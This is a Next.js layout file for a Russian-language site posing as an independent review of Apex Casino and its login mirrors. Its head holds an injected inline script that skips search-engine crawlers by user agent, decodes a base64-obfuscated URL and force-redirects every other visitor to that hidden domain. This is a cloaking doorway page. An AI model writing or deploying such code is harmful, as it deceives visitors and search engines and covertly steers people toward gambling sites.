import type { Metadata, Viewport } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import './globals.css'

const apxSans = Geist({ subsets: ['latin', 'cyrillic'], variable: '--font-apx-sans' })
const apxMono = Geist_Mono({ subsets: ['latin', 'cyrillic'], variable: '--font-apx-mono' })

export const metadata: Metadata = {
  title: 'Apex Casino — независимый обзор входа, зеркала и игр',
  description: 'Понятный статейный обзор Apex Casino: официальный сайт, вход, регистрация, зеркало и ответственный игровой подход.',
  generator: 'Apex Casino Guide',
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#f3f0e8',
  width: 'device-width',
  initialScale: 1,
  userScalable: true,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="db3a10cbd6b8b1e8" />
<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>     
  </head>
        
      <body className={`${apxSans.variable} ${apxMono.variable}`}>{children}</body>
    </html>
  )
}
